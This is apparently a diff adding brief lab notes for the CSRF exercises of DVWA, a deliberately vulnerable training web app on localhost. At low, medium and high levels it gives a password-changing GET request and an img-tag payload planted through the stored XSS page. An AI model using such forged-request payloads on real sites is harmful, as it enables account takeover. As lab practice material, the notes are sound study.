@@ -1,0 +1,18 @@
+LOW :
+
+Get the GET Request from inspect element :
+http://localhost/dvwa/vulnerabilities/csrf/?password_new=hari&password_conf=hari&Change=Change
+change password and verify
+
+MEDIUM :
+
+In xss stored low
+<img src="/dvwa/vulnerabilities/csrf/?password_new=hari&password_conf=hari&Change=Change
+">
+
+HIGH :
+
+
+In xss stored low ( extra usertoken will come in link)
+<img src="/dvwa/vulnerabilities/csrf/?password_new=hari&password_conf=hari&Change=Change
+">
